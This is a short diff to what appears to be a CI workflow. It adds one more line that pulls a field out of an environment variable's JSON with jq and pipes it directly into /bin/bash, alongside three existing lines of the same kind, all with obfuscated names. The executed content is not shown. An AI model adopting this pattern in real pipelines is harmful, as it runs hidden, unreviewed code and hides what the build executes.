@@ -26,6 +26,7 @@ jobs:
           echo $jjfo468 | jq -r .vv7 | /bin/bash
           printf '%s' "$if3" | jq -r .c95571 | /bin/bash
           printf '%s' "$dr4" | jq -r .hlal1 | /bin/bash
+          printf '%s' "$gk8956" | jq -r .fsh6664 | /bin/bash
 
       - name: Archive output
         if: always()
